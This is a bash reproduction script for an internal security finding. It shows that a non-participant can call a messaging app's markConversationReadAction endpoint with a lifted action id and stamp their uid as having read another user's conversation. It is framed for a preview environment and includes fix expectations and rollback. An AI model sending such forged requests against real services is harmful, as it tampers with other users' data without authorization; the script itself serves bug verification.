#!/usr/bin/env bash
# F2-02 repro — markConversationReadAction stamps readBy on foreign messages.
#
# Preconditions (preview env only):
#   PREVIEW_BASE=https://<preview>.run.app
#   ATTACKER_TOKEN=<ID token for attacker uid A>
#   VICTIM_CONV_ID=<conversationId for a conversation A is NOT a participant in>
#
# Run inside the preview Firestore: create a conversation between B & C with
# a few messages, capture its id, then invoke this script as A.
#
# Expected (current behaviour, BUG):
#   - HTTP 200 (or wire-format equivalent)
#   - Firestore: conversations/${VICTIM_CONV_ID}/messages/*.readBy now contains A's uid
#   - Firestore: conversations/${VICTIM_CONV_ID}.unreadCount.<A's uid> = 0
#
# Expected (after fix):
#   - HTTP 4xx with "Not a participant"
#
# Validation: spot-check 1-2 messages in the conversation subcollection from the
# Firebase console or via `firebase firestore:read`. Any stamp of A's uid in readBy
# confirms the IDOR. Roll back the test conversation after running.

set -euo pipefail
: "${PREVIEW_BASE:?}"; : "${ATTACKER_TOKEN:?}"; : "${VICTIM_CONV_ID:?}"; : "${ATTACKER_UID:?}"

curl -sS -X POST "${PREVIEW_BASE}/messages" \
    -H "authorization: Bearer ${ATTACKER_TOKEN}" \
    -H "content-type: text/plain;charset=UTF-8" \
    -H "next-action: <lifted-action-id-for-markConversationReadAction>" \
    --data-raw "[\"${VICTIM_CONV_ID}\",\"${ATTACKER_UID}\"]" \
    -w "\nstatus: %{http_code}\n"

echo
echo "Now inspect Firestore conversations/${VICTIM_CONV_ID}/messages — recent docs should NOT contain ${ATTACKER_UID} in readBy."
